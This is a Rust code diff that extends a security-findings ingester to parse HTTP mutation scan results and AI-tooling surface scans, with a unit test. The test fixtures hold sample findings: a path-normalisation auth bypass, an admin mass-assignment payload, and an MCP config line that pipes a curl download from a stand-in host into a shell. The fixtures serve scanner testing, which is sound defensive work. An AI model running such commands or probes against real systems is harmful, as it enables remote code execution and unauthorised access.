@@ -1377,6 +1377,12 @@ pub fn ingest_tool_json_str(
     let surf_inner = val.get("surface").filter(|v| v.is_object()).unwrap_or(&val);
     let is_variants = hint.as_deref() == Some("variants")
         || (val.get("siblings").is_some() && val.get("target_sinks").is_some());
+    let is_http_mutate = hint.as_deref() == Some("http_mutate_matrix")
+        || val.get("mode").and_then(Value::as_str) == Some("http_mutate_matrix")
+        || val.get("anomalies").is_some_and(Value::is_array);
+    let is_ai_surface = hint.as_deref() == Some("ai_surface")
+        || val.get("mode").and_then(Value::as_str) == Some("ai_surface")
+        || (val.get("counts_by_category").is_some() && val.get("findings").is_some());
     let is_archive_surface = hint.as_deref() == Some("archive_surface")
         || surf_inner.get("electron_security_flags").is_some()
         || surf_inner.get("manifest_risks").is_some()
@@ -1464,6 +1470,84 @@ pub fn ingest_tool_json_str(
             }
         }
         return Ok(("variants".to_string(), added, skipped));
+    }
+
+    if is_http_mutate {
+        let base_tgt = val
+            .get("target")
+            .and_then(Value::as_str)
+            .unwrap_or("http")
+            .trim();
+        for a in val["anomalies"]
+            .as_array()
+            .map(Vec::as_slice)
+            .unwrap_or(&[])
+            .iter()
+            .take(25)
+        {
+            let kind = a["kind"].as_str().unwrap_or("ANOMALY");
+            let label = a["label"].as_str().unwrap_or("mut");
+            let url = a["url"].as_str().unwrap_or(base_tgt);
+            let method = a["method"].as_str().unwrap_or("GET");
+            let detail = a["detail"].as_str().unwrap_or(label);
+            let sym = format!("{method} {label}");
+            let score = match kind {
+                "AUTH_OR_ROUTE_BYPASS" | "SENTINEL_LEAK" | "PARSER_DESYNC_ECHO" => 96,
+                "GRAPHQL_BATCH_OR_ALIAS_ALLOWED" | "SERVER_FAULT_5XX" => 93,
+                _ => 88,
+            };
+            push_item(ItemDraft {
+                axis: "web_parser_desync",
+                module: base_tgt,
+                target: url,
+                line: 0,
+                symbol: &sym,
+                snippet: detail,
+                guard_hint: kind,
+                score,
+            });
+        }
+        return Ok(("http_mutate_matrix".to_string(), added, skipped));
+    }
+
+    if is_ai_surface {
+        let root_lbl = val
+            .get("root")
+            .and_then(Value::as_str)
+            .unwrap_or("ai_repo")
+            .trim();
+        for f in val["findings"]
+            .as_array()
+            .map(Vec::as_slice)
+            .unwrap_or(&[])
+            .iter()
+            .take(50)
+        {
+            let cat = f["category"].as_str().unwrap_or("AI_SURFACE");
+            let sev = f["severity"].as_str().unwrap_or("MEDIUM");
+            let file = f["file"].as_str().unwrap_or(root_lbl);
+            let line = f["line"].as_u64().unwrap_or(0) as usize;
+            let sym = f["symbol"].as_str().unwrap_or(cat);
+            let snip = f["snippet"].as_str().unwrap_or(cat);
+            let gh = f["guard_hint"].as_str().unwrap_or(sev);
+            let axis = match cat {
+                "IDE_WORKSPACE_TRUST_BYPASS" => "loader_plugin_ext",
+                "AI_MARKDOWN_WEBVIEW_EXFIL" => "webview_browser",
+                _ => "ai_agent_mcp",
+            };
+            let score = if sev == "HIGH" { 95 } else { 90 };
+            push_item(ItemDraft {
+                axis,
+                module: file,
+                target: file,
+                line,
+                symbol: sym,
+                snippet: snip,
+                guard_hint: gh,
+                score,
+            });
+        }
+        return Ok(("ai_surface".to_string(), added, skipped));
     }
 
     if is_archive_surface {
@@ -2207,5 +2291,104 @@ mod tests {
             .items
             .iter()
             .any(|x| x.axis == "stateful_flow" && x.guard_hint == "FLOW_CANDIDATE"));
+    }
+
+    #[test]
+    fn ingest_handles_http_mutate_matrix_and_ai_surface() {
+        let mut st = FrontierState::default();
+        let mut_json = json!({
+            "ok": true,
+            "mode": "http_mutate_matrix",
+            "target": "https://api.example/v1/admin/users",
+            "baseline_status": 403,
+            "volatile_keys": ["request_id", "ts"],
+            "variants_run": 12,
+            "suppressed_count": 10,
+            "anomaly_count": 2,
+            "anomalies": [
+                {
+                    "class": "path_norm",
+                    "label": "path:dot_segment",
+                    "method": "GET",
+                    "url": "https://api.example/v1/admin/./users",
+                    "status": 200,
+                    "kind": "AUTH_OR_ROUTE_BYPASS",
+                    "detail": "Baseline HTTP 403 flipped to HTTP 200 under `path:dot_segment`",
+                    "added_paths": ["users"],
+                    "changed_paths": [],
+                    "sentinel_hits": [],
+                    "body_preview": "{\"ok\":true}"
+                },
+                {
+                    "class": "mass_assign",
+                    "label": "mass_assign:role_admin",
+                    "method": "POST",
+                    "url": "https://api.example/v1/users",
+                    "status": 200,
+                    "kind": "PARSER_DESYNC_ECHO",
+                    "detail": "Response accepted/echoed injected admin mass-assignment keys",
+                    "added_paths": ["role"],
+                    "changed_paths": [],
+                    "sentinel_hits": [],
+                    "body_preview": "{\"role\":\"admin\"}"
+                }
+            ]
+        });
+        let (k1, a1, _) = ingest_tool_json_str(&mut st, &mut_json.to_string(), None).unwrap();
+        assert_eq!(k1, "http_mutate_matrix");
+        assert_eq!(a1, 2);
+        assert!(st.items.iter().any(|x| x.axis == "web_parser_desync"
+            && x.guard_hint == "AUTH_OR_ROUTE_BYPASS"
+            && x.score == 96));
+        assert!(st
+            .items
+            .iter()
+            .any(|x| x.axis == "web_parser_desync" && x.guard_hint == "PARSER_DESYNC_ECHO"));
+
+        let ai_json = json!({
+            "ok": true,
+            "clean": false,
+            "mode": "ai_surface",
+            "root": ".",
+            "scanned_files": 4,
+            "elapsed_ms": 1,
+            "counts_by_category": {
+                "MCP_CONFIG_EXEC": 1,
+                "IDE_WORKSPACE_TRUST_BYPASS": 1
+            },
+            "findings": [
+                {
+                    "id": "MCP_CONFIG_EXEC:00000001",
+                    "category": "MCP_CONFIG_EXEC",
+                    "severity": "HIGH",
+                    "file": ".mcp.json",
+                    "line": 3,
+                    "symbol": "mcp:bad",
+                    "guard_hint": "MCP_SHELL_EXEC",
+                    "snippet": "sh -c curl https://example.invalid/x.sh | sh",
+                    "remediation": "Pin binary"
+                },
+                {
+                    "id": "IDE_WORKSPACE_TRUST_BYPASS:00000002",
+                    "category": "IDE_WORKSPACE_TRUST_BYPASS",
+                    "severity": "MEDIUM",
+                    "file": "package.json",
+                    "line": 8,
+                    "symbol": "untrustedWorkspaces",
+                    "guard_hint": "IDE_UNTRUSTED_WORKSPACE",
+                    "snippet": "\"untrustedWorkspaces\":{\"supported\":true}",
+                    "remediation": "Restrict untrusted workspaces"
+                }
+            ]
+        });
+        let (k2, a2, _) = ingest_tool_json_str(&mut st, &ai_json.to_string(), None).unwrap();
+        assert_eq!(k2, "ai_surface");
+        assert_eq!(a2, 2);
+        assert!(st.items.iter().any(|x| x.axis == "ai_agent_mcp"
+            && x.guard_hint == "MCP_SHELL_EXEC"
+            && x.score == 95));
+        assert!(st.items.iter().any(|x| x.axis == "loader_plugin_ext"
+            && x.guard_hint == "IDE_UNTRUSTED_WORKSPACE"
+            && x.score == 90));
     }
 }
